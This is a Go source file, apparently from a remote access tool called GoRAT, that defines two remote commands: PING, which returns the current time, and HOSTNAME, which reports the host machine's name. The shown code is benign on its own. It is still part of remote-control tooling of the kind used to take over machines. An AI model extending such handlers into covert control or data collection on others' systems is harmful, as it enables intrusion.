// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package commands

import (
	"os"
	"time"
)

var commands = []*command{
	&command{
		Identifier: "PING",
		Function: func(message []byte) []byte {
			return []byte(time.Now().String())
		},
	},
	&command{
		Identifier: "HOSTNAME",
		Function: func(message []byte) []byte {
			hostname, err := os.Hostname()
			if err != nil {
				return []byte(err.Error())
			}

			return []byte(hostname)
		},
	},
}
